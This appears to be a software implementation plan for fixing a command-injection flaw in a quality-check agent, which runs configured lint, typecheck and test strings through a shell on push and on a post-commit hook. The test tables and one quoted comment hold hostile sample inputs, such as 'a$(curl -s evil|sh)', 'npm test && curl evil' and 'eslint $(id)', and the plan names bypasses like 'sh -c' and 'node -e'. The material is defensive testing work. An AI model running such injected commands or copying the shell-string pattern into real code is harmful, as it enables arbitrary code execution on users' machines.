---
iron_loop_verdict: true
title: "A configured check command reaches a shell that was never meant to interpret it — the quality agent runs its lint, typecheck and test commands as argument vectors"
type: implementation
parent_plan: none
depends_on: none
priority: CRITICAL
program: ctoc-repair-loop
iron_loop: true
files:
  - "src/lib/quality-agent.js"
  - "tests/quality-agent-no-shell.test.js"
approved_by: human
approved_at: 2026-07-29T11:09:26.630Z
gate_crossed: implementation → todo
---

# A configured check command reaches a shell that was never meant to interpret it

## The defect, read on disk

`src/lib/quality-agent.js:97-124`:

```js
function runCommand(cmd, options = {}) {
  const { silent = false, allowFail = false, timeout = 300000 } = options;
  try {
    const output = execSync(cmd, { encoding: 'utf8', … });
```

`execSync` with a string runs `/bin/sh -c` (POSIX) or `cmd.exe /d /s /c` (Windows). The
whole string is interpreted.

Three call sites feed it a command that came from configuration:

```
:435  const result = runCommand(langTools.lint,      { allowFail: true, silent: true });
:459  const result = runCommand(langTools.typecheck,  { allowFail: true, silent: true });
:523  result = runCommand(langTools.test,             { allowFail: true, silent: true });
:585  const result = runCommand(langTools.test,       { allowFail: true, silent: true });
```

`langTools` comes from `tool-detector`, whose own header at `:2-10` states its first
source:

> 1. User config (`.ctoc/quality-config.yaml`) - explicit override

and `capability-registry` supplies the rest from `.ctoc/capabilities/languages/*.yaml`,
whose header at `:19-24` states the contract that the other half of the system honours:

> **SECURITY — IT RETURNS COMMANDS, IT NEVER RUNS THEM.** A hostile or malformed
> `.ctoc/capabilities` file must never be remote code execution … a `cmd` from a
> capability file is an inert STRING the caller may …

The registry keeps its half of that contract. `quality-agent` does not keep the other
half for `lint`, `typecheck` and the full-test fallback.

### Why the source is reachable

`src/hooks/PreToolUse.Edit.js:69` whitelists `/^\.ctoc\//` unconditionally. The two
carve-outs are `.ctoc/approvals` and `.ctoc/state/verify`. `.ctoc/quality-config.yaml`
and `.ctoc/capabilities/languages/*.yaml` are under the whitelist and are therefore
writable by any agent, with no plan, no coverage, no approval.

### Why it fires without a human

- `src/commands/push.js` runs the tiered checks on `/ctoc:push`;
- `src/lib/hooks-installer.js` installs a git **post-commit** hook that runs the quality
  agent **detached** after every commit.

So a string written into a whitelisted configuration file executes on the human's own
ordinary action, in the background, with nobody watching the output.

### The contrast is inside the same module

`runCommandArgv` at `:148-172` does the right thing, and its comment at `:127-141`
explains exactly why it exists:

> On the old `execSync(\`npx jest ${files.join(' ')}\`)` string path a path like
> `a$(curl -s evil|sh).test.js` was a shell command substitution and ran arbitrary code
> on every `/ctoc:push`; here it is one literal argv element, inert.

The lesson was learned and applied to the test-file operands. It was not applied to the
command strings themselves. **The defect is one call site's form, not the design.**

## The fix

Route configuration-derived commands through an argv path, and **refuse loudly** any
configured command that cannot be expressed as one.

### The parse

A new `parseConfiguredCommand(cmd)` splits a configured command string into
`{ bin, args }`:

- tokens split on whitespace, honouring single and double quotes so
  `eslint --format "compact json"` keeps its argument intact;
- a command containing an unquoted `&&`, `||`, `|`, `;`, `&`, `$(`, a backtick, `<`, `>`
  or a newline is **rejected**, not split;
- an empty or whitespace-only command is rejected;
- the function returns `{ ok: false, reason }` rather than throwing.

This is the same rule `src/lib/app-runner.js` already applies to the declared entry
point (`CLAUDE.md`: "run WITHOUT a shell (argument array; a command containing `&&`,
`||`, `|`, `;` or `&` is rejected as undrivable)"). Using the shipped, reviewed
precedent rather than a new rule is deliberate.

### The refusal is a failed check, not a skip

A rejected command returns the same `{ passed: false, errors: 1, output }` shape the
check already returns on failure, with an output naming the language, the key
(`lint`/`typecheck`/`test`), the rejected command and the reason. It is **not** a skip
and **not** a pass: a configured check that cannot be run has not passed, and the "no
silent test failures" rule in `CLAUDE.md` makes the loud outcome mandatory.

### The back-compat cost, stated

The comment at `:519-523` explicitly blesses the shell path for the full-test fallback:

> `langTools.test` is a CONFIGURED command string from the detector (e.g. `npm test`)
> with NO file-derived interpolation, so it legitimately stays on the shell path — a
> user's `npm test && ...` still works.

**After this slice, `npm test && something` stops working and fails loudly.** That is a
deliberate, breaking behaviour change, and it is the right one: "a user may have
configured a compound command" and "a written string executes on every commit" are the
same capability described from two directions. A user who needs a compound command puts
it in a script and configures the script — which is reviewable, and which is exactly the
argument `PreToolUse.Bash.js:41-47` already makes about checked-in artifacts.

Step 14 must report how many commands in this repository's own detected toolchain and in
`.ctoc/capabilities/languages/*.yaml` are rejected by the new parse. If that number is
not zero for the bundled files, the bundled files are corrected — never the parse.

### What is NOT changed

`runCommand` itself stays, and stays on the shell, for the **hardcoded, first-party**
strings that legitimately need it: `git diff HEAD~1 --name-only` at `:669` and
`git push` at `:1274`. Those are literals in the source, not configuration. Deleting
`runCommand` would force them onto a path they do not need and enlarge this slice for no
security gain. Its doc comment gains one line: it must never be called with a
configuration-derived string, and the three call sites that did are named.

## Implementation Details

### File: `src/lib/quality-agent.js`
**Action:** MODIFY — add `parseConfiguredCommand` and `runConfiguredCommand`; change
four call sites; annotate `runCommand`

```js
/**
 * Split a CONFIGURED command string into an argument vector, or refuse it.
 *
 * A configured command comes from `.ctoc/quality-config.yaml` or
 * `.ctoc/capabilities/languages/*.yaml` — both under the `/^\.ctoc\//` edit whitelist,
 * both agent-writable, and both reaching this module on `/ctoc:push` and on the
 * detached post-commit hook. Handing such a string to execSync is remote code execution
 * on the human's own commit. Every shell operator is REFUSED rather than parsed: this
 * is the rule app-runner already applies to the declared entry point.
 *
 * Return-never-throw.
 *
 * @param {string} cmd
 * @returns {{ok: true, bin: string, args: string[]} | {ok: false, reason: string}}
 */
function parseConfiguredCommand(cmd)
```

```js
/**
 * Run a CONFIGURED command with no shell, or return a FAILED check describing why it
 * could not be run. Never silently skips: an unrunnable check has not passed.
 *
 * @param {string} cmd
 * @param {{silent?: boolean, allowFail?: boolean, timeout?: number}} [options]
 * @returns {{success: boolean, output: string, error?: string, timedOut?: boolean, refused?: boolean}}
 */
function runConfiguredCommand(cmd, options = {})
```

`runConfiguredCommand` delegates to the existing `runCommandArgv` on a successful parse,
so the `{success, output, error, timedOut}` contract, the `allowFail` capture, the
`silent` flag and the 300000 ms timeout are inherited unchanged — the parity
`runCommandArgv`'s comment at `:138-141` already promises.

Call-site changes:

| line | from | to |
|---|---|---|
| `:435` | `runCommand(langTools.lint, …)` | `runConfiguredCommand(langTools.lint, …)` |
| `:459` | `runCommand(langTools.typecheck, …)` | `runConfiguredCommand(langTools.typecheck, …)` |
| `:523` | `runCommand(langTools.test, …)` | `runConfiguredCommand(langTools.test, …)` |
| `:585` | `runCommand(langTools.test, …)` | `runConfiguredCommand(langTools.test, …)` |

At `:435` and `:459` the existing `if (!result.success)` branch already returns a failed
check with `result.output || result.error`; a refusal flows through it unchanged, so the
failure surfaces without new branching. Confirm that at Step 9 by reading each branch —
if a branch treats an empty output as a pass, that is a second defect to report.

Add to `runCommand`'s doc comment:

```
 * NEVER call this with a CONFIGURATION-DERIVED string. `.ctoc/quality-config.yaml` and
 * `.ctoc/capabilities/**` are agent-writable (the `/^\.ctoc\//` edit whitelist), and this
 * function's string form is interpreted by a shell. Configured lint/typecheck/test
 * commands go through runConfiguredCommand. This function is for FIRST-PARTY LITERALS
 * only — the two remaining callers are `git diff HEAD~1 --name-only` and `git push`.
```

Add both new functions to `module.exports` — `push.js` consumes this module as a
library, and the test drives them directly against a real fixture.

### File: `tests/quality-agent-no-shell.test.js`
**Action:** CREATE — `node:test`

Parse cases:

| # | Input | Expected |
|---|---|---|
| 1 | `eslint .` | ok, bin `eslint`, args `['.']` |
| 2 | `npx tsc --noEmit` | ok, args `['tsc','--noEmit']` |
| 3 | `eslint --format "compact json" src` | ok, three args, the quoted one intact |
| 4 | `eslint --rulesdir 'my dir'` | ok, single quotes honoured |
| 5 | **`npm test && curl evil`** | refused, reason names the operator |
| 6 | **`eslint . ; touch /tmp/x`** | refused |
| 7 | **``eslint `id` ``** | refused |
| 8 | **`eslint $(id)`** | refused |
| 9 | `eslint . \| tee out` | refused |
| 10 | `eslint . > out` | refused |
| 11 | `''`, `'   '`, `null`, `42` | refused, no throw |
| 12 | a quoted operator: `eslint --msg "a && b"` | **ok** — quoted operators are data, not structure. Records that the parse is quote-aware, not a blunt substring scan |

Execution cases, against a real temp fixture:

| # | Setup | Assertion |
|---|---|---|
| 13 | **the payload never executes** | fixture project, `.ctoc/quality-config.yaml` configuring lint as `eslint . && node -e "require('fs').writeFileSync(process.env.PROOF,'x')"`; run `runLint`; assert the proof file **does not exist**, the check `passed` is false, and the output names the refusal. This is the defect measured end to end |
| 14 | the same through `typecheck` | same shape |
| 15 | the same through the full-test path | same shape |
| 16 | **a refused check is a FAILURE, never a skip or a pass** | `passed === false` and `errors >= 1` in all three |
| 17 | a legitimate simple command still runs | configure lint as `node --version`; `runLint` passes and captures the output |
| 18 | a genuinely failing command still fails | configure lint as `node -e "process.exit(1)"` → wait: that is an interpreter but a valid argv, so it runs. Assert `passed === false` from the exit code, proving refusal and failure are distinguishable |
| 19 | timeout parity | configure a command that sleeps past a 200 ms timeout; assert `timedOut` is surfaced, matching `runCommand`'s contract |
| 20 | **the bundled capability files all parse** | read every `.ctoc/capabilities/languages/*.yaml` from disk, extract every `lint`, `typecheck` and `test` command, assert `parseConfiguredCommand` accepts each. A rejection here is a defect in the bundled file and is fixed there |
| 21 | this repository's own detected toolchain parses | run `tool-detector` against the repository root and assert every returned command parses |
| 22 | Windows spelling | `parseConfiguredCommand('npx.cmd tsc --noEmit')` → ok. Assert nothing in the parse assumes a POSIX binary name |

Case 18's note matters and must be kept in the test file as a comment: an argv-safe
interpreter invocation is still allowed by this slice, because the parse refuses *shell
structure*, not *programs*. A configured `node -e '<payload>'` runs. That is stated in
"What this plan does NOT fix" and is the reason `00204` exists.

Fixtures under `os.tmpdir()`, `path.join` throughout, `fs.promises.rm` teardown. The
proof-file path is passed by environment variable so no test writes into the repository.

---

### Wiring — the live call sites

| change | live call site | root |
|---|---|---|
| `runConfiguredCommand` | `runLint:435`, `runTypecheck:459`, `runSmartTests:523`, `runFullTests:585` | `src/commands/push.js` → `/ctoc:push`, and the installed git post-commit hook |
| `parseConfiguredCommand` | `runConfiguredCommand` | same |

All four call sites are on the live push path and the live post-commit path. Nothing
here is reachable only from a test.

## Test Plan

Covered by `tests/quality-agent-no-shell.test.js`. Cases 5-10 and 13-15 are the defect;
case 13 is the one that proves it end to end by the absence of a file the payload would
have written. Cases 12, 17, 20 and 21 are the guards against the parse becoming so strict
that real configurations stop working.

## Execution Plan (Steps 8-16)

### Step 8: TEST
Write the file in full and run only it. Cases 5-11, 13-16 and 19 must be RED. **Record
case 13's red verbatim: the proof file existing is the demonstration that a string in a
whitelisted configuration file executed.** Run that case in a temp fixture only; never
let the payload touch the repository.

### Step 9: PREPARE
Read from disk: `quality-agent.js:94-172` (both runners), `:420-600` (the four call
sites and each `if (!result.success)` branch), `src/lib/tool-detector.js:1-120` (where
`quality-config.yaml` is read and what shape `langTools` has),
`src/lib/capability-registry.js:1-80`, `src/lib/app-runner.js:540-600` (the shipped
argv-split precedent to mirror), `src/commands/push.js`, and `src/lib/hooks-installer.js`
(confirm the post-commit hook really runs this module detached). **Where the code
disagrees with this plan, THE CODE WINS.**

### Step 10: IMPLEMENT
- `src/lib/quality-agent.js` — `parseConfiguredCommand`, `runConfiguredCommand`, four
  call sites, `runCommand`'s doc comment, both exports.
- `tests/quality-agent-no-shell.test.js` — the twenty-two cases.

### Step 11: REVIEW
Confirm no configuration-derived string reaches `execSync`. Grep the whole module for
`runCommand(` and confirm every remaining caller passes a source literal. Confirm a
refusal produces a failed check on every one of the four paths, and that none of them
can turn a refusal into a pass.

### Step 12: OPTIMIZE
The parse is one pass over a short string. `runCommandArgv` avoids a shell process per
check, which is marginally faster than what it replaces.

### Step 13: SECURE
Re-attack the parse as an adversary who has read it: quoted operators, escaped
operators, unicode look-alikes, a binary name that is itself a shell (`sh -c '…'` — which
parses as a valid argv and **runs**), a leading `env`, a leading `sudo`. Every success is
either added to the refusal set or written verbatim into "What this plan does NOT fix".
`sh -c` is already known and belongs in the second list.

### Step 14: VERIFY
`node --test` on the new file plus every existing `quality-agent`, `push` and
`tool-detector` test, then the full gated run `npm test`. Lint at `--max-warnings 0`. No
git operations. **Report the case-20 and case-21 counts: how many bundled and detected
commands the new parse rejects. Any non-zero count on a bundled file is fixed in the
bundled file.**

### Step 15: DOCUMENT
Note in `CLAUDE.md` that configured lint, typecheck and test commands are run as
argument vectors with no shell, and that a configured command containing a shell
operator is refused as a failed check. Update the documented test-file count from disk.

### Step 16: FINAL-REVIEW
Report every Step 8 red verbatim (case 13 especially), every Step 13 re-attack that
succeeded, the case-20/21 counts, and every decision taken under ambiguity.

## What this plan does NOT fix

- It does **not** stop a configured command from being an interpreter. `node -e '<payload>'`
  and `sh -c '<payload>'` are valid argument vectors and **run**. This slice removes the
  *implicit* shell, not the ability to configure a program that is one. Closing that
  means restricting *which* binaries may be configured, which is a different and larger
  design.
- It does **not** stop the configuration files from being written. That is `00204`, which
  removes them from the `/^\.ctoc\//` whitelist. Either slice alone is a partial fix;
  together they close the write and the execution.
- It does **not** touch `package.json` `scripts`, which is the same pattern one level
  out: `npm test` runs whatever `scripts.test` says. `package.json` is not whitelisted,
  so an Edit needs plan coverage — but a plan that legitimately declares `package.json`
  grants shell execution on the next push. Named, not fixed.
- It does **not** protect the declared entry point in `.ctoc/settings.json`. It is
  already argv-split with shell operators rejected, so its blast radius is an arbitrary
  program rather than an arbitrary shell — smaller, and still open. See the decision
  below.
- It does **not** remove `execSync` from `quality-agent.js`; two first-party literal
  commands keep it.
- It does **not** audit the other twelve modules under `src/lib/` that import `execSync`.

## Decisions Taken During Implementation

1. **`parseConfiguredCommand` returns a FLAT shape** `{ok, bin, args, reason}`, not a
   discriminated union. checkJs (`tsc --noEmit`) would not narrow the JSDoc union
   `{ok:true,…}|{ok:false,reason}` — it widened `ok` to `boolean`, so `parsed.reason`
   failed to type-check. The flat shape (the same style `app-runner.js` uses for
   `resolveScriptCommand`) needs no narrowing: on success `bin`/`args` carry the argv and
   `reason` is `''`; on a refusal `bin`/`args` are empty and `reason` names the structure.
2. **`runConfiguredCommand` takes an optional `options.label`** (e.g. `"javascript lint"`)
   so the refusal message names the language and key, as the plan asked, WITHOUT adding a
   branch at any call site — the refusal flows through the existing `if (!result.success)`
   unchanged. `runCommandArgv` ignores the extra key.
3. **Composition with plan 00208 (test-selection) — Case 4 assertion retargeted, a
   TIGHTENING.** `tests/test-selection-scope.test.js` Case 4 (`git unavailable on PATH runs
   the full suite`) asserted the full-suite CONFIGURED command reached the `execSync`
   SHELL path (`shellCalls.some(c => c.includes('-e'))`). This slice moves that command to
   the argv path (call site #4, `runFullTests`), so the assertion could not stay literally
   true without leaving the vulnerability unfixed. It was re-pointed at the argv path (the
   seam now captures non-git `execFileSync` calls) AND now also asserts the command NEVER
   reaches the shell — strictly stronger, intent preserved (the full suite still runs, still
   proven by `assertFullSuiteRan` + `passCount`). The git-DELTA path (`getPushDeltaBlobs`)
   was NOT touched; both named 00208 tests stay green. This is the same category of
   blast-radius tightening the coverage-test fallback needed.
4. **`runCommand` doc comment corrected, not just annotated.** The plan's suggested text
   named `git diff HEAD~1 --name-only` as a remaining caller; that command no longer exists
   (00208 replaced it with `getPushDeltaBlobs`, argv-only) and the literal string trips
   00208's Case 10 drift guard. The comment now names the one real remaining caller: the
   hardcoded `git push` in `pushToRemote`.
5. **CLAUDE.md and the documented test-file count were NOT edited.** The plan's Step 15
   asked for a CLAUDE.md note; the executor brief explicitly forbade any CLAUDE.md edit and
   scope creep. Brief (latest instruction) overrides the plan here.

## Decisions Taken Under Ambiguity

1. **Shell operators are refused, not escaped or split.** Escaping is a losing game
   against a shell's grammar, and splitting on operators would silently execute a
   different command than the one configured. Refusal is the only answer that cannot be
   subtly wrong, and it matches the shipped entry-point rule.
2. **A refusal is a failed check, not a skip.** A skip would make a hostile
   configuration *quieter* than a benign one — the configuration that cannot be run
   would stop being reported. `CLAUDE.md`'s "no silent test failures" makes this
   non-negotiable.
3. **The documented `npm test && …` back-compat is broken deliberately.** It is the
   defect described as a feature. A user needing a compound command configures a script,
   which is reviewable.
4. **The parse is quote-aware (case 12).** A blunt substring scan for `&&` would reject
   `eslint --msg "a && b"`, which is a legitimate configuration, and a guard that
   rejects legitimate input gets disabled.
5. **`runCommand` is kept for first-party literals.** Removing it would move `git push`
   and `git diff` onto a path they do not need, enlarging a security slice with unrelated
   churn. Its doc comment now states the boundary so the next caller does not repeat this.
6. **The entry-point declaration is left to a later decision rather than folded in
   here.** It lives in a different file (`app-runner.js`), reads a different source
   (`.ctoc/settings.json`), and is already argv-only — a genuinely smaller blast radius.
   Protecting `settings.json` wholesale would block ordinary configuration work through
   the menu, so the right fix is a narrow guard on the `entry_point` key specifically,
   and that deserves its own evidence rather than a ride-along.
7. **`sh -c` remains configurable and is listed as open.** Refusing it means a binary
   allowlist, which is a policy decision about what a project may configure — the
   human's call, not a ride-along in an injection fix.
8. **The bundled capability files are corrected if they fail the parse, never the
   parse.** A rule that bends to its own seed data is not a rule.


## Deferred Questions

_Written by the Iron Loop integrator (src/lib/iron-loop.js), which performs NO
quality evaluation. These entries are the integrator's own report on itself, not
findings from a critic that read this plan._

- **evaluation**: NOT EVALUATED — no automated critique was performed on this plan. The refinement loop appended the Steps 8-16 template and assessed nothing. (The scores this step used to report were computed from that same template, not from the plan.) A human or a real critic must review this plan before it is built.
